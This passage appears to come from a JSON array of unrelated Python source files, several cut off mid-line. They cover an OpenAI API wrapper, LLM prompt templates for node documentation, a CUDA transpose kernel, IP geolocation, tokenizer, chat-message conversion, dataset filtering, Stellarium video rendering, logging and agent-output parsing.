\"messages\": messages,\n            **generation_configs\n        }\n        chat_response = client.chat.completions.create(**query_obj)\n        print(chat_response)\n        print()\n        print(chat_response.choices[0].message.content)\n        inputs.append(messages)\n        responses.append(chat_response.choices[0].message.content)\n\n    # === save perception results ===\n    os.makedirs(output_perception_dir, exist_ok=True)\n    w, h = Image.open(img_path).size\n    resized_img_size_for_vis = (w, h) # use original size\n    response_dict = {}\n    for i, response in enumerate(responses):\n        svg_path = svg_paths[i]\n        svg_basename = os.path.basename(svg_path)\n        vis_img = visualize_pvd_shape_prediction(response, resized_img_size_f",
    "\"\"\"\nUtility functions for interacting with OpenAI API.\n\"\"\"\n\nimport os\nimport openai\n\n\ndef setup_openai_api(api_key: str | None = None) -> None:\n    \"\"\"\n    A function to set up the OpenAI API by providing an API key,\n    either through parameter or environment variable.\n\n    Parameters:\n    api_key (str | None): The API key to authenticate with OpenAI API. Defaults to None.\n\n    Returns:\n    None\n    \"\"\"\n\n    if api_key is not None:\n        os.environ[\"OPENAI_API_KEY\"] = api_key\n        openai.api_key = api_key\n    elif os.getenv(\"OPENAI_API_KEY\") is not None:\n        openai.api_key = os.getenv(\"OPENAI_API_KEY\")\n    else:\n        raise ValueError(\n            \"No OpenAI API key provided. Please set it as an env variable in the os.environ\"\n        )\n\n\nclass OpenAIModelQA:\n    \"Creates an object for QA using an OpenAI model\"\n\n    def __init__(\n        self,\n        model: str = \"gpt-4\",\n        system_prompt: str = \"\",\n        temperature: float = 0.1,\n        max_tokens: int = 2000,\n        frequency_penalty: float = 1.1,\n        api_key: str | None = None,\n    ) -> None:\n        \"\"\"\n        Initializes the class with the specified model, system prompt, temperature, max tokens, frequency penalty, and API key.\n\n        Args:\n            model (str): The GPT model to use for the generation.\n            system_prompt (str): The prompt to provide to the GPT model.\n            temperature (float): The temperature parameter for generation.\n            max_tokens (int): The maximum number of tokens to generate.\n            frequency_penalty (float): The frequency penalty parameter for generation.\n            api_key (str | None): The API key for accessing the OpenAI API, or None if not provided.\n        \"\"\"\n\n        setup_openai_api(api_key)\n        self.model = model\n        self.temperature = temperature\n        self.max_tokens = max_tokens\n        self.frequency_penalty = frequency_penalty\n        self.system_prompt = system_prompt\n        self.client = openai.OpenAI(api_key=os.getenv(\"OPENAI_API_KEY\"))\n\n    def __call__(self, prompt: str) -> str:\n        \"\"\"\n        A method that generates a response based on the given prompt.\n\n        Parameters:\n            prompt (str): The prompt for which a response needs to be generated.\n\n        Returns:\n            str: The response generated based on the prompt.\n        \"\"\"\n\n        messages = [\n            {\"role\": \"system\", \"content\": self.system_prompt},\n            {\"role\": \"user\", \"content\": prompt},\n        ]\n        response = self.client.chat.completions.create(\n            model=self.model,\n            messages=messages,\n            temperature=self.temperature,\n            max_tokens=self.max_tokens,\n            frequency_penalty=self.frequency_penalty,\n        )\n\n        return response.choices[0].message.content.strip()\n\n\n# def qa_with_openai_models(\n#     prompt: str,\n#     model: str = \"gpt-4\",\n#     system_prompt: str = \"\",\n#     temperature: float = 0.1,\n#     max_tokens: int = 2000,\n#     frequency_penalty: float = 1.1,\n# ) -> str:\n#     \"\"\"\n#     Basic function for QA wih OpenAI models.\n\n#     Args:\n#         prompt (str): The prompt for the question-answering task.\n#         model (str, optional): The name of the OpenAI model to use. Defaults to \"gpt-4\".\n#         system_prompt (str, optional): The system prompt to include in the conversation. Defaults to \"\".\n#         temperature (float, optional): The temperature parameter for sampling responses. Defaults to 0.1.\n#         max_tokens (int, optional): The maximum number of tokens in the response. Defaults to 2000.\n#         frequency_penalty (float, optional): The frequency penalty parameter for sampling responses. Defaults to 1.1.\n\n#     Returns:\n#         str: The generated response.\n#     \"\"\"\n\n#     messages = [{\"role\": \"system\", \"content\": system_prompt}, {\"role\": \"user\", \"content\": prompt}]\n#     client = openai.OpenAI(api_key=os.getenv(\"OPENAI_API_KEY\"))\n\n#     response = client.chat.completions.create(\n#         model=model,\n#         messages=messages,\n#         temperature=temperature,\n#         max_tokens=max_tokens,\n#         frequency_penalty=frequency_penalty,\n#     )\n\n#     return response.choices[0].message.content.strip()\n",
    "from pydantic import BaseModel, Field, create_model\nfrom typing import List\nfrom llama_index.core.base.llms.types import ChatMessage, MessageRole\nfrom llama_index.core.prompts.base import ChatPromptTemplate\n\n\nSYSTEM_PROMPT = \"\"\"\nYou are FlowGPT, an assistant that can generate documentation for nodes based on provided context information:\nYou extract data and return it in JSON format, according to provided JSON schema.\nUse your own knowledge to give more insights into high level technical concepts.\n\"\"\"\n\nUSER_PROMPT = \"\"\"\nContext information is below.\n---------------------\n{context_str}\n---------------------\nGiven the context information, answer the query.\nQuery: {query_str}\nAnswer:\n\"\"\"\n\nTEXT_QA_PROMPTS = ChatPromptTemplate(\n    message_templates=[\n        ChatMessage(content=SYSTEM_PROMPT, role=MessageRole.SYSTEM),\n        ChatMessage(content=USER_PROMPT, role=MessageRole.USER),\n    ]\n)\n\nPROMPT_DOCUMENTATION = \"\"\"\nProvide a docstring for a method named FUNCTION of the node in 1-2 sentences, focusing solely on the node's purpose\nand high-level functionality. Your description should abstractly convey the node's capabilities and aims without referencing\nspecific methods by name, detailing inputs or outputs, or discussing nested functions.\nEmphasize the node's overall contribution in a conceptual manner, aiming for a thematic overview rather than a\nprocedural breakdown. Ensure the narrative centers on the node's functionality, steering clear of method-specific language.\n\"\"\"\n\nPROMPT_INPUT_PARAMETER = \"\"\"\nFor the parameter, provide not only a description of its function but also its importance in the overall operation (1-2 sentences).\nInclude explanations on how it affects the node's execution and results.\nDon't mention parameter min, max and default values and parameter type.\nFor collapsed parameters like \"input_blocks.i.j.transformer_blocks.k.attn2.to_q\" additionally explain the range of each index.\n\"\"\"\n\nPROMPT_OUTPUT_PARAMETER = \"Detail parameter, including a description of its function and significance (1-2 sentences).\"\n\nPROMPT_INPUT_TYPES = \"\"\"\nElaborate on each type from the INPUT_TYPES of the node. The types names are specified in the list: \"{input_parameters}\".\nEnsure to accurately list all names exactly as they appear, without altering spellings or resorting to generalizations.\nIt's crucial that each type name is presented and elaborated on precisely as provided.\n\"\"\"\n\nPROMPT_OUTPUT_TYPES = \"\"\"\nElaborate on each type from the RETURN_TYPES of the node. The types names are specified in the list: \"{output_parameters}\".\nEnsure to accurately list all names exactly as they appear, without altering spellings or resorting to generalizations.\nIt's crucial that each type name is presented and elaborated on precisely as provided.\nAdditionally, if analysis of the node's code reveals that it returns a dictionary in the form {{\"ui\": ...}},\nyou must add a new parameter named ui (without any variations) to the list.\nDescribe the ui parameter in the same manner as the other parameters.\n\"\"\"\n\nPROMPT_INFRA_TYPE = \"\"\"Respond in one word: GPU if GPU is recommended to run the node, CPU otherwise.\nTypically, use GPU for nodes involving pytorch/tensorflow, and CPU for nodes accessing models via API or not using models.\"\"\"\n\nPROMPT_PYTHON_DTYPE = \"\"\"\nIdentify the precise Python data type of the parameter,\nincluding both standard types (e.g., int, str) and types from libraries (e.g., torch.Tensor, torch.nn.Module).\nFor collections, detail the types of contained elements (e.g., Dict[str, Tuple[int, torch.Tensor]] instead of just dict).\nAvoid vague descriptors like object or Any, seeking specificity.\nRefrain from using ComfyUI-specific references (e.g., comfy.sd.vae).\n\"\"\"\n\n\nclass NodeInputParameter(BaseModel):\n    \"\"\"Data model for a node input parameter\"\"\"\n\n    name: str | None = Field(description=\"Parameter name\", default=None)\n    documentation: str | None = Field(description=PROMPT_INPUT_PARAMETER, default=None)\n    python_dtype: str | None = Field(description=PROMPT_PYTHON_DTYPE, default=None)\n\n\nclass NodeOutputParameter(BaseModel):\n    \"\"\"Data model for a node output parameter\"\"\"\n\n    name: str | None = Field(description=\"Parameter name\", default=None)\n    documentation: str | None = Field(description=PROMPT_OUTPUT_PARAMETER, default=None)\n    python_dtype: str | None = Field(description=PROMPT_PYTHON_DTYPE, default=None)\n\n\nclass Node(BaseModel):\n    \"\"\"Data model for a node\"\"\"\n\n    name: str | None = Field(description=\"Node name\", default=None)\n    documentation: str | None = Field(description=PROMPT_DOCUMENTATION, default=None)\n    input_types: List[NodeInputParameter] | None = Field(description=PROMPT_INPUT_TYPES, default=None)\n    output_types: List[NodeOutputParameter] | None = Field(description=PROMPT_OUTPUT_TYPES, default=None)\n    infra_type: str | None = Field(description=PROMPT_INFRA_TYPE, default=None)\n\n    @classmethod\n    def format_field_description(cls, field_name: str, **kwargs) -> None:\n        field = cls.__fiel",
    "import ctypes\nimport functools\n\nfrom ....core.cache import cached\n\nfrom ....compiler.template import substitude\nfrom ....compiler.cxx import CXXUnit, import_symbol\nfrom ...compiler import nvcc\n\n@cached()\ndef generate_transpose_kernel(name: str, dtype: str):\n    kernel_name = f\"minit_{name}\"\n    kernel_template =\\\n\"\"\"\n#include <cuda.h>\n#include <cuda_fp16.h>\n#include <cuda/std/array>\n#include <stdexcept>\n\n\n#define CUDA_ASSERT(expr)                                           \\\\\n    do {                                                            \\\\\n        auto _err = (expr);                                         \\\\\n        if (_err != cudaSuccess) {                                  \\\\\n            throw std::runtime_error(cudaGetErrorString(_err));     \\\\\n        }                                                           \\\\\n    } while (0)\n\nusing T = ${DATA_TYPE};\n\ntemplate <size_t nr_ranks>\nstruct TensorIterator {\n    size_t shape[nr_ranks];\n\n    __device__ cuda::std::array<size_t, nr_ranks> to_index(size_t offset) const {\n        cuda::std::array<size_t, nr_ranks> index;\n        for (size_t i = 0; i < nr_ranks; ++i) {\n            index[nr_ranks-i-1] = offset % shape[nr_ranks-i-1];\n            offset /= shape[nr_ranks-i-1];\n        }\n        return index;\n    }\n\n    __device__ size_t to_offset(cuda::std::array<size_t, nr_ranks> index) const {\n        size_t offset = 0;\n        for (size_t i = 0; i < nr_ranks; ++i) {\n            offset *= shape[i];\n            offset += index[i];\n        }\n        return offset;\n    }\n};\n\n// input[a, b, c, d, e] -> output[a, d, c, b, e]\n__global__ void kernel(T* input, T* output, size_t a, size_t b, size_t c, size_t d, size_t e) {\n    size_t stride = blockDim.x * gridDim.x;\n    size_t nr_elements = a * b * c * d * e;\n    TensorIterator<5> input_iterator{a, b, c, d, e};\n    TensorIterator<5> output_iterator{a, d, c, b, e};\n    for (size_t offset = blockIdx.x * blockDim.x + threadIdx.x; offset < nr_elements; offset += stride) {\n        size_t output_offset = offset;\n        auto index = output_iterator.to_index(output_offset);\n        cuda::std::swap(index[1], index[3]);\n        size_t input_offset = input_iterator.to_offset(index);\n        output[output_offset] = input[input_offset];\n    }\n}\n\nextern \"C\" void ${KERNEL_NAME} (cudaStream_t stream, T* input, T* output, size_t a, size_t b, size_t c, size_t d, size_t e) {\n    static constexpr size_t nr_sms = 64;\n    size_t nr_elements = a * b * c * d * e;\n    size_t nr_threads_per_block = std::min((size_t)1024, (size_t)((nr_elements + nr_sms - 1) / nr_sms));\n    size_t nr_blocks = (nr_elements + nr_threads_per_block - 1) / nr_threads_per_block;\n    kernel<<<nr_blocks, nr_threads_per_block, 0, stream>>>(input, output, a, b, c, d, e);\n}\n\"\"\"\n    source = substitude(kernel_template, {\n        \"DATA_TYPE\": dtype,\n        \"KERNEL_NAME\": kernel_name,\n    })\n    kernel = nvcc.compile(CXXUnit(source=source))\n    @import_symbol(kernel, kernel_name)\n    def entrance(\n        stream: ctypes.c_void_p,\n        input: ctypes.c_void_p,\n        output: ctypes.c_void_p,\n        a: ctypes.c_size_t,\n        b: ctypes.c_size_t,\n        c: ctypes.c_size_t,\n        d: ctypes.c_size_t,\n        e: ctypes.c_size_t,\n    ):\n        ...\n    return entrance\n",
    "import requests\n\n\ndef find_loc():\n    try:\n        # use the request module to get the public IP address of the machine using the ipify API\n        ipadd = requests.get(\"https://api.ipify.org\").text\n        # Construct the url for obtaining geographical information based on the IP address using the geojs.io API\n        url = \"https://get.geojs.io/v1/ip/geo/\" + ipadd + \".json\"\n\n        # use 'requests' to send a GET request to the geojs.io API and get the geographic information in JSON format\n        geo = requests.get(url)\n        geo.raise_for_status()  # Raise an exception for HTTP errors\n\n        geo_data = geo.json()\n\n        print(geo_data)  # print the obtained geographic in JSON format\n\n        # Extract relevant information from the JSON response\n        city = geo_data[\"city\"]\n        country = geo_data[\"country\"]\n        # state = geo_data[\"state\"]\n        latitude = geo_data[\"latitude\"]\n        longitude = geo_data[\"longitude\"]\n        timezone = geo_data[\"timezone\"]\n        internet = geo_data[\"organization\"]\n\n        # print the extracted information in a formatted manner\n        print(\n            f\"city = {city}\\ncountry = {country}\\n\\nlatitude = {latitude}\\nlongitude = {longitude}\\ntimezone = {timezone}\\ninternet = {internet}\"\n        )\n\n        return f\"city = {city}\\ncountry = {country}\\n\\nlatitude = {latitude}\\nlongitude = {longitude}\\ntimezone = {timezone}\\ninternet = {internet}\"\n\n    except requests.RequestException as e:\n        print(\"Error occurred during HTTP request:\", e)\n        return \"Error occurred during HTTP request. Please try again.\"\n    except KeyError as e:\n        print(\"KeyError occurred while parsing JSON response:\", e)\n        return \"Error occurred while parsing JSON response. Please try again.\"\n\n\n# find_loc()\n",
    "# Copyright 2024 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport os\nfrom typing import List, Optional\n\nfrom sentencepiece import SentencePieceProcessor\n\n\nclass Tokenizer:\n\n  def __init__(self, model_path: Optional[str]):\n    # Reload tokenizer.\n    assert os.path.isfile(model_path), model_path\n    self.sp_model = SentencePieceProcessor(model_file=model_path)\n\n    # BOS / EOS token IDs.\n    self.n_words: int = self.sp_model.vocab_size()\n    self.bos_id: int = self.sp_model.bos_id()\n    self.eos_id: int = self.sp_model.eos_id()\n    self.pad_id: int = self.sp_model.pad_id()\n    assert self.sp_model.vocab_size() == self.sp_model.get_piece_size()\n\n  def encode(self, s: str, bos: bool = True, eos: bool = False) -> List[int]:\n    \"\"\"Converts a string into a list of tokens.\"\"\"\n    assert isinstance(s, str)\n    t = self.sp_model.encode(s)\n    if bos:\n      t = [self.bos_id] + t\n    if eos:\n      t = t + [self.eos_id]\n    return t\n\n  def decode(self, t: List[int]) -> str:\n    \"\"\"Converts a list of tokens into a string.\"\"\"\n    return self.sp_model.decode(t)\n",
    "import base64\nimport sys\nfrom io import BytesIO\nfrom pathlib import Path\nfrom urllib.parse import quote, unquote\nfrom typing import List, TYPE_CHECKING, Union, Tuple\n\nfrom lagrange.client.message.elems import Text, Image, At, Audio, Quote, MarketFace\nfrom lagrange.client.message.types import T\n\nfrom loguru import logger\nfrom satori.element import (\n    Style as SatoriStyle,\n    Br as SatoriBr,\n    Paragraph as SatoriParagraph,\n)\nfrom satori import (\n    Element as SatoriElement,\n    At as SatoriAt,\n    Text as SatoriText,\n    Quote as SatoriQuote,\n    Image as SatoriImage,\n    Audio as SatoriAudio,\n    Message as SatoriMessage,\n    Link as SatoriLink,\n)\nfrom .utils import download_resource, transform_audio\n\nif TYPE_CHECKING:\n    from lagrange.client.client import Client\n\n\ndef encode_data_url(data: Union[str, bytes], mime_type=\"\"):\n    if isinstance(data, str):\n        encoded = quote(data)\n    elif isinstance(data, bytes):\n        encoded = base64.b64encode(data)\n        mime_type += \";base64\"\n    else:\n        raise TypeError(f\"Type {type(data)} not supported\")\n    return f\"data:{mime_type},{encoded}\"\n\n\ndef decode_data_url(url: str) -> Tuple[str, bytes]:\n    if url.find(\"data:\") != 0:\n        raise ValueError(\"Not a valid Data URL\")\n    head, data = url[5:].split(\",\", 1)\n    if head.find(\";\") != -1:\n        mime, enc_type = head.split(\";\", 1)\n        if enc_type == \"base64\":\n            decoded = base64.b64decode(data)\n        else:\n            raise TypeError(f\"Type {enc_type} not supported\")\n    else:\n        mime = head\n        decoded = unquote(data).encode()\n    return mime, decoded\n\n\nasync def parse_resource(url: str) -> bytes:\n    logger.debug(f\"loading resource: {url[:80]}\")\n    if url.find(\"http\") == 0:\n        return await download_resource(url)\n    elif url.find(\"data\") == 0:\n        _, data = decode_data_url(url)\n        return data\n    elif url.find(\"file://\") == 0:\n        if sys.platform == \"win32\":\n            path = Path(url[8:])\n        else:\n            path = Path(url[7:])\n        if not path.exists():\n            raise FileNotFoundError(f\"File not found: {path.absolute()}\")\n        with open(path, \"rb\") as f:\n            return f.read()\n    else:\n        raise ValueError(\"Unsupported URL: %s\" % url)\n\n\nasync def msg_to_satori(msgs: List[T]) -> List[SatoriElement]:\n    new_msg: List[SatoriElement] = []\n    for m in msgs:\n        if isinstance(m, At):\n            new_msg.append(SatoriAt(str(m.uin), m.text))\n        elif isinstance(m, Quote):\n            new_msg.append(SatoriQuote(str(m.seq), False))\n        elif isinstance(m, (Image, MarketFace)):\n            new_msg.append(SatoriImage(str(m.url), width=m.width, height=m.height))\n        elif isinstance(m, Audio):\n            new_msg.append(SatoriAudio(m.name))\n        elif isinstance(m, Text):\n            new_msg.append(SatoriText(m.text))\n        else:\n            logger.warning(\"cannot parse message to satori \" + repr(m)[:100])\n    return new_msg\n\n\nasync def satori_to_msg(client: \"Client\", msgs: List[SatoriElement], *, grp_id=0, uid=\"\") -> List[T]:\n    new_msg: List[T] = []\n    for m in msgs:\n        if isinstance(m, SatoriAt):\n            new_msg.append(At(f\"@{m.name}\", int(m.id), \"\"))\n        elif isinstance(m, SatoriQuote):\n            target = await client.get_grp_msg(grp_id, int(m.id))\n            new_msg.append(Quote.build(target[0]))\n        elif isinstance(m, SatoriImage):\n            data = await parse_resource(m.src)\n            if grp_id:\n                new_msg.append(\n                    await client.upload_grp_image(BytesIO(data), grp_id)\n                )\n            elif uid:\n                new_msg.append(\n                    await client.upload_friend_image(BytesIO(data), uid)\n                )\n            else:\n                raise AssertionError\n        elif isinstance(m, SatoriText):\n            new_msg.append(Text(m.text))\n        elif isinstance(m, SatoriLink):\n            parsed = await satori_to_msg(client, m._children, grp_id=grp_id, uid=uid)\n            new_msg.extend(parsed)\n            new_msg.append(Text(f\"{': ' if parsed else ''}{m.url}\"))\n        elif isinstance(m, (SatoriMessage, SatoriStyle)):\n            if isinstance(m, SatoriBr):\n                new_msg.append(Text(\"\\n\"))\n            else:\n                new_msg.extend(\n                    await satori_to_msg(client, m._children, grp_id=grp_id, uid=uid)\n                )\n                if isinstance(m, SatoriParagraph):\n                    new_msg.append(Text(\"\\n\"))\n        elif isinstance(m, SatoriAudio):\n            data = await transform_audio(\n                BytesIO(await parse_resource(m.src))\n            )\n            if grp_id:\n                new_msg.append(\n                    await client.upload_grp_audio(data, grp_id)\n                )\n            elif uid:\n                new_msg.append(\n                    await client.upload_friend_audio(data, uid)\n                )\n            else:\n                raise AssertionError\n        els",
    "import re\nimport os\nimport json\nimport argparse\n\nranges = [\n    {\"from\": ord(u\"\\u3300\"), \"to\": ord(u\"\\u33ff\")},         # compatibility ideographs\n    {\"from\": ord(u\"\\ufe30\"), \"to\": ord(u\"\\ufe4f\")},         # compatibility ideographs\n    {\"from\": ord(u\"\\uf900\"), \"to\": ord(u\"\\ufaff\")},         # compatibility ideographs\n    {\"from\": ord(u\"\\U0002F800\"), \"to\": ord(u\"\\U0002fa1f\")}, # compatibility ideographs\n    {'from': ord(u'\\u3040'), 'to': ord(u'\\u309f')},         # Japanese Hiragana\n    {\"from\": ord(u\"\\u30a0\"), \"to\": ord(u\"\\u30ff\")},         # Japanese Katakana\n    {\"from\": ord(u\"\\u2e80\"), \"to\": ord(u\"\\u2eff\")},         # cjk radicals supplement\n    {\"from\": ord(u\"\\u4e00\"), \"to\": ord(u\"\\u9fff\")},\n    {\"from\": ord(u\"\\u3400\"), \"to\": ord(u\"\\u4dbf\")},\n    {\"from\": ord(u\"\\U00020000\"), \"to\": ord(u\"\\U0002a6df\")},\n    {\"from\": ord(u\"\\U0002a700\"), \"to\": ord(u\"\\U0002b73f\")},\n    {\"from\": ord(u\"\\U0002b740\"), \"to\": ord(u\"\\U0002b81f\")},\n    {\"from\": ord(u\"\\U0002b820\"), \"to\": ord(u\"\\U0002ceaf\")}  # included as of Unicode 8.0\n]\n\nbbox_pattern = r'\\[\\d\\.\\d+, \\d\\.\\d+, \\d\\.\\d+, \\d\\.\\d+\\]'\n\ndef is_cjk(char):\n    return any([range[\"from\"] <= ord(char) <= range[\"to\"] for range in ranges])\n\ndef has_cjk(word):\n    return any([is_cjk(char) for char in word])\n\ndef has_bbox_format(text):\n    matches = re.search(bbox_pattern, text)\n    return bool(matches)\n\nif __name__ == '__main__':\n    args = argparse.ArgumentParser()\n\n    args.add_argument(\"--folder\", type=str, required=True)\n    args.add_argument(\"--output\", type=str, required=True)\n\n    args = args.parse_args()\n\n    folder = args.folder\n    output = args.output\n\n    files = sorted(os.listdir(folder))\n\n    cjk_cnt = 0\n    \n    bbox_cnt = 0\n\n    removed_ids = []\n\n    for file in files:\n        print(\"filename\", file)\n        \n        data = json.load(open(os.path.join(folder, file)))\n\n        for item in data:\n            id = item[\"id\"]\n            conversation = item[\"conversation\"]\n            for turn in conversation:\n                content = turn[\"content\"]\n\n                flag = True\n\n                if has_cjk(content):\n                    print(f\"id {id}\", \"Has cjk\", content)\n                    cjk_cnt += 1\n                    flag = False\n\n                if has_bbox_format(content):\n                    print(f\"id {id}\", \"Has bbox format\", content)\n                    bbox_cnt += 1\n                    flag = False\n                \n                if flag == False:\n                    removed_ids.append(id)\n                \n    \n    print(f\"Folder {folder}\", \"Total\", cjk_cnt, \"items have Chinese, Japanese, Korean characters (CJK)\")\n    print(f\"Folder {folder}\", \"Total\", bbox_cnt, \"items have bbox format\")\n\n\n    if not os.path.exists(output):\n        os.makedirs(output)\n\n    for file in files:\n        filtered_data = []\n\n        data = json.load(open(os.path.join(folder, file)))\n\n        for item in data:\n            if item[\"id\"] not in removed_ids:\n                filtered_data.append(item)\n        \n        with open(os.path.join(output, file), 'w') as f:\n            json.dump(filtered_data, f, ensure_ascii=False, indent=4)\n\n    ",
    "from skyfield import almanac\nfrom skyfield.api import load, wgs84\nfrom typing import Tuple\n\nimport argparse\nimport isodate\nimport re\nimport os\nimport os.path\n\nfrom datetime import datetime, date, timezone\nfrom pathlib import Path\nfrom geopy.geocoders import Nominatim\n\nimport subprocess\nimport time\nimport tempfile\nimport shutil\n\nversion = \"2.0.1\"\n\n\nclass Parameters:\n    def __init__(self, args: argparse.Namespace) -> None:\n        lonlat: list = args.loc[0]\n        city: str = args.loc[1]\n        view: list[float] = args.view\n\n        self.__az: float = view[0]\n        self.__alt: float = view[1]\n        self.__fov: float = view[2]\n        self.__lon: float = lonlat[0]\n        self.__lat: float = lonlat[1]\n        self.__city: str = city\n        self.__planet: str = args.planet\n        self.__caption: str = args.caption\n        self.__outfile: str = args.outfile\n        self.__timespan: float = args.timespan\n        self.__delta_t: float = args.dt\n        self.__fps: float = args.fps\n        self.__show_video: bool = args.show_video\n        self.__template: str = args.template\n        self.__start_date: datetime = self.__determine_start_time(args.date)\n        self.__video_size = args.video_size\n\n        self.__window_size: Tuple[int, int] | None\n        if args.window_size is None:\n            self.__window_size = None\n        else:\n            if 'x' not in args.window_size:\n                raise ValueError('The window size must be of the form \"1920x1080\"')\n\n            width_str, height_str = args.window_size.split('x')\n            self.__window_size = (int(width_str), int(height_str))\n\n    def __determine_start_time(self, date: datetime) -> datetime:\n        if date.hour == 0 and date.minute == 0 and date.second == 0 and self.planet == 'Earth':\n            self.__start_at_sunset = True\n\n            latlon = wgs84.latlon(self.lat, self.lon)\n            ts = load.timescale()\n            eph = load('de421.bsp')\n            observer = eph['Earth'] + latlon\n\n            t = ts.utc(date.year, date.month, date.day)\n            t0, t1 = t, ts.utc(t.utc[0], t.utc[1], t.utc[2], 24)\n            t_set, y_set = almanac.find_settings(observer, eph['Sun'], t0, t1)\n\n            if y_set[0] == False:\n                raise ValueError(\n                    f'You must specify a specific time because the location {self.lon},{self.lat} is experiencing either polar day or polar night! The script cannot compute a sunset time for this date: {date.isoformat()}.')\n\n            return t_set[0].utc_datetime()\n        else:\n            self.__start_at_sunset = False\n            return date\n\n    @property\n    def alt(self) -> float:\n        return self.__alt\n\n    @property\n    def az(self) -> float:\n        return self.__az\n\n    @property\n    def fov(self) -> float:\n        return self.__fov\n\n    @property\n    def lon(self) -> float:\n        return self.__lon\n\n    @property\n    def lat(self) -> float:\n        return self.__lat\n\n    @property\n    def city(self) -> str:\n        return self.__city\n\n    @property\n    def planet(self) -> str:\n        return self.__planet\n\n    @property\n    def start_date(self) -> datetime:\n        return self.__start_date\n\n    @property\n    def caption(self) -> str:\n        return self.__caption\n\n    @property\n    def outfile(self) -> str:\n        return self.__outfile\n\n    @property\n    def timespan(self) -> float:\n        return self.__timespan\n\n    @property\n    def delta_t(self) -> float:\n        return self.__delta_t\n\n    @property\n    def fps(self) -> float:\n        return self.__fps\n\n    @property\n    def show_video(self) -> bool:\n        return self.__show_video\n\n    @property\n    def start_at_sunset(self) -> bool:\n        return self.__start_at_sunset\n\n    @property\n    def template(self) -> str:\n        return self.__template\n\n    @property\n    def template_file(self) -> Path:\n        tempate_folder: Path = Path(os.path.dirname(os.path.realpath(__file__)))\n        return tempate_folder / 'script' / self.__template\n\n    @property\n    def video_size(self) -> str:\n        return self.__video_size\n\n    @property\n    def window_size(self) -> Tuple[int, int] | None:\n        return self.__window_size\n\n\nclass StellariumToVideo:\n    def __init__(self, param: Parameters) -> None:\n        tempPath: Path = Path(tempfile.gettempdir()) / 'kalstar_frames'\n        self.__frame_folder = tempPath\n        self.__final_file = self.__frame_folder / 'final.png'\n        self.__first_file = self.__frame_folder / 'first.png'\n        self.__param = param\n\n        # Create frame folder if it not already exists\n        if os.path.exists(str(self.__frame_folder)):\n            shutil.rmtree(str(self.__frame_folder))\n\n        os.mkdir(str(self.__frame_folder))\n\n    def create_script(self, script_path: Path) -> None:\n        with open(self.__param.template_file, 'r') as file:\n            script = file.read()\n\n        if os.name == 'nt':\n            script = script.replace(\"$FRAME_FOLDER$\", str(self.__frame_folder).replace(\"\\\\\", ",
    "import sys\nimport logging\n\n\nclass LoggerHandler(logging.Handler):\n    r\"\"\"\n    Logger handler used in Web UI.\n    \"\"\"\n\n    def __init__(self):\n        super().__init__()\n        self.log = \"\"\n\n    def reset(self):\n        self.log = \"\"\n\n    def emit(self, record):\n        if record.name == \"httpx\":\n            return\n        log_entry = self.format(record)\n        self.log += log_entry\n        self.log += \"\\n\\n\"\n\n\ndef get_logger(name: str) -> logging.Logger:\n    r\"\"\"\n    Gets a standard logger with a stream hander to stdout.\n    \"\"\"\n    formatter = logging.Formatter(\n        fmt=\"%(asctime)s - %(levelname)s - %(name)s - %(message)s\",\n        datefmt=\"%m/%d/%Y %H:%M:%S\"\n    )\n    handler = logging.StreamHandler(sys.stdout)\n    handler.setFormatter(formatter)\n\n    logger = logging.getLogger(name)\n    logger.setLevel(logging.INFO)\n    logger.addHandler(handler)\n\n    return logger\n\n\ndef reset_logging() -> None:\n    r\"\"\"\n    Removes basic config of root logger. (unused in script)\n    \"\"\"\n    root = logging.getLogger()\n    list(map(root.removeHandler, root.handlers))\n    list(map(root.removeFilter, root.filters))\n",
    "import os\n\nfrom Tool.Respond_Agent_Section_Tool import FinalResponse_SectionAgent\n\n\ndef extract_result(text):\n    \"\"\"A function to extract output when Claude occasionally fails to use the provided tools for structured output.\n    Args:\n       text: The final response from the agent\n    Returns:\n       The extracted result for each tag\n    \"\"\"\n    pattern_result = r'<result>(.*?)<\\/result>'\n    pattern_section_complete = r'<section_complete>(.*?)<\\/section_complete>'\n    pattern_section_title = r'<section_title>(.*?)<\\/section_title>'\n    pattern_section_content = r'<section_content>(.*?)<\\/section_content>'\n    pattern_section_thought = r'<section_thought>(.*?)<\\/section_thought>'\n    import re\n    match_result = re.search(pattern_result, text, re.DOTALL)\n    match_section_title = re.search(pattern_section_title, text, re.DOTALL)\n    match_section_content = re.search(pattern_section_content, text, re.DOTALL)\n    match_section_thought = re.search(pattern_section_thought, text, re.DOTALL)\n    match_section_complete = re.search(pattern_section_complete, text, re.DOTALL)\n    if match_result:\n        if match_section_title and match_section_content and match_section_thought:\n            return {\n                \"section_title\": match_section_title.group(1).strip(),\n                \"section_content\": match_section_content.group(1).strip(),\n                \"section_thought\": match_section_thought.group(1).strip()\n            }\n        else:\n            return match_result.group(1).strip()\n    elif match_section_complete:\n        if match_section_title and match_section_content and match_section_thought:\n            return {\n                \"section_title\": match_section_title.group(1).strip(),\n                \"section_content\": match_section_content.group(1).strip(),\n                \"section_thought\": match_section_thought.group(1).strip()\n            }\n        else:\n            return match_section_complete.group(1).strip()\n    elif match_section_title and match_section_content and match_section_thought:\n        return {\n            \"section_title\": match_section_title.group(1).strip(),\n            \"section_content\": match_section_content.group(1).strip(),\n            \"section_thought\": match_section_thought.group(1).strip()\n        }\n    else:\n        return None\n\n\ndef parse_result_to_document_format(document: dict | FinalResponse_SectionAgent | str) -> str:\n    \"\"\"Returns the agent's response in different document formats based on the response type (dict, str, FinalResponse_SectionAgent)\n    Args:\n        document: The response generated by the agent, which can be one of dict, str, or FinalResponse_SectionAgent\n    Return:\n        If the document type is dict or FinalResponse_SectionAgent, extracts and returns as str\n        If the document type is str, returns as is\n    \"\"\"\n    if isinstance(document, FinalResponse_SectionAgent):\n        return f\"{document.section_title}\\n\\n{document.section_content}\\n\\n\\n####Researcher Opinion\\n\\n{document.section_thought}\\n\\n\\n\\n\"\n    elif isinstance(document, dict):\n        section_title = document.get(\"section_title\")\n        section_content = document.get(\"section_content\")\n        section_thought = document.get(\"section_thought\")\n        return f\"{section_title}\\n\\n{section_content}\\n\\n\\n####Researcher Opinion\\n\\n{section_thought}\\n\\n\\n\\n\"\n    else:\n        return 